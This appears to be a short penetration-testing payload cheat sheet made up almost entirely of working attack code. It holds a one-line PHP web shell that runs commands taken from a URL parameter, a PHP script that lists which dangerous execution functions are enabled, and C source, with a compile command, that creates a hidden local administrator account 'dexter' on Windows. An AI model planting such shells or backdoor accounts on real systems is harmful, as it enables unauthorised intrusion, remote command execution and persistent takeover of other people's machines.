# Payload


## PHP
```php
<?php system($_GET['cmd']); ?>

// check functions 
<?php

$dangerous_functions = array('pcntl_alarm','pcntl_fork','pcntl_waitpid','pcntl_wait','pcntl_wifexited','pcntl_wifstopped','pcntl_wifsignaled','pcntl_wifcontinued','pcntl_wexitstatus','pcntl_wtermsig','pcntl_wstopsig','pcntl_signal','pcntl_signal_get_handler','pcntl_signal_dispatch','pcntl_get_last_error','pcntl_strerror','pcntl_sigprocmask','pcntl_sigwaitinfo','pcntl_sigtimedwait','pcntl_exec','pcntl_getpriority','pcntl_setpriority','pcntl_async_signals','error_log','system','exec','shell_exec','popen','proc_open','passthru','link','symlink','syslog','ld','mail');

foreach ($dangerous_functions as $f) {
  if (function_exists($f)) {
    echo $f . " is enabled<br/>\n";
  }
}
?>
```

## Windows
```c
#include <stdlib.h>
int main ()
{
    // compile: x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
    int i;
  
    i = system ("net user dexter @Password123 /add");
    i = system ("net localgroup administrators dexter /add");

    return 0;
}
```